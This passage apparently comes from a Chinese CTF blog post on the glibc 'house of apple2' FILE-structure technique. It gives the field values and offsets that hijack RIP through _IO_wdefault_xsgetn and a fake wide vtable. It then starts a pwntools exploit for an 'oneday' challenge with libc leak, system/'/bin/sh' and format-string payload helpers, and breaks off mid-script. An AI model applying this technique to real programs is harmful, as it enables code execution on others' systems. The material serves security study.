      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
    <span class="p">}</span>
      <span class="n">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span><span class="c1">// 需要走到这里</span>
    <span class="p">}</span>
    <span class="c1">//......</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>需要设置<code class="language-plaintext highlighter-rouge">fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code class="language-plaintext highlighter-rouge">fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>

<h3 id="利用_io_wdefault_xsgetn函数控制程序执行流">利用_IO_wdefault_xsgetn函数控制程序执行流</h3>

<p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p>

<p>对<code class="language-plaintext highlighter-rouge">fp</code>的设置如下：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">_flags</code>设置为<code class="language-plaintext highlighter-rouge">0x800</code></li>
  <li><code class="language-plaintext highlighter-rouge">vtable</code>设置为<code class="language-plaintext highlighter-rouge">_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code class="language-plaintext highlighter-rouge">_IO_wdefault_xsgetn</code>即可</li>
  <li><code class="language-plaintext highlighter-rouge">_mode</code>设置为大于<code class="language-plaintext highlighter-rouge">0</code>，即满足<code class="language-plaintext highlighter-rouge">*(fp + 0xc0) &gt; 0</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">A</code>，即满足<code class="language-plaintext highlighter-rouge">*(fp + 0xa0) = A</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code class="language-plaintext highlighter-rouge">0</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 8) = *A</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0x20) &gt; *(A + 0x18)</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code class="language-plaintext highlighter-rouge">B</code>，即满足<code class="language-plaintext highlighter-rouge">*(A + 0xe0) = B</code></li>
  <li><code class="language-plaintext highlighter-rouge">_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code class="language-plaintext highlighter-rouge">C</code>用于劫持<code class="language-plaintext highlighter-rouge">RIP</code>，即满足<code class="language-plaintext highlighter-rouge">*(B + 0x18) = C</code></li>
</ul>

<p>函数的调用链如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">_IO_wdefault_xsgetn</span>
    <span class="n">__wunderflow</span>
        <span class="n">_IO_switch_to_wget_mode</span>
            <span class="n">_IO_WOVERFLOW</span>
                <span class="o">*</span><span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)(</span><span class="n">fp</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>详细分析如下：
首先看<code class="language-plaintext highlighter-rouge">_IO_wdefault_xsgetn</code>函数：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre></td><td class="rouge-code"><pre><span class="kt">size_t</span>
<span class="nf">_IO_wdefault_xsgetn</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">more</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
  <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">wchar_t</span><span class="o">*</span><span class="p">)</span> <span class="n">data</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(;;)</span>
    <span class="p">{</span>
      <span class="cm">/* Data available. */</span>
      <span class="kt">ssize_t</span> <span class="n">count</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span>
                       <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">count</span> <span class="o">&gt;</span> <span class="n">more</span><span class="p">)</span>
        <span class="n">count</span> <span class="o">=</span> <span class="n">more</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">s</span> <span class="o">=</span> <span class="n">__wmempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">else</span>
        <span class="p">{</span>
          <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
          <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">count</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
        <span class="o">*</span><span class="n">s</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="p">;</span>
          <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">more</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">more</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">__wunderflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
    <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">more</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_wdefault_xsgetn</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>由于<code class="language-plaintext highlighter-rouge">more</code>是第三个参数，所以不能为<code class="language-plaintext highlighter-rouge">0</code>。
直接设置<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code class="language-plaintext highlighter-rouge">count</code>为<code class="language-plaintext highlighter-rouge">0</code>，不进入<code class="language-plaintext highlighter-rouge">if</code>分支。
随后当<code class="language-plaintext highlighter-rouge">more != 0</code>时会进入<code class="language-plaintext highlighter-rouge">__wunderflow</code>。</p>

<p>接着看<code class="language-plaintext highlighter-rouge">__wunderflow</code>：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kt">wint_t</span>
<span class="nf">__wunderflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
 
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="c1">// ......</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>要想调用到<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode</code>，需要设置<code class="language-plaintext highlighter-rouge">fp-&gt;mode &gt; 0</code>，并且<code class="language-plaintext highlighter-rouge">fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>

<p>然后在<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode</code>函数中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kt">int</span>
<span class="nf">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span> <span class="c1">// 需要走到这里</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="c1">// .....</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>当满足<code class="language-plaintext highlighter-rouge">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW(fp)</code>。</p>

<h2 id="例题分析">例题分析</h2>

<h3 id="oneday">oneday</h3>

<p>house of apple2解法</p>

<p>前文有结构体内容，是利用_IO_wfile_overflow函数控制程序执行流</p>

<p>exp:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./oneday</span><span class="sh">'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">breakpoints</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">__call_tls_dtors</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span><span class="n">breakpoints</span><span class="p">]</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">b </span><span class="si">{</span><span class="n">bp</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#asm(shellcraft.sh()).ljust(0x108,b'a')
</span>
<span class="k">def</span> <span class="nf">set_key</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">key &gt;&gt;</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">choise</span><span class="p">):</span>
   <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">command:</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
   <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">choise: </span><span class="sh">'</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">choise</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dele</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
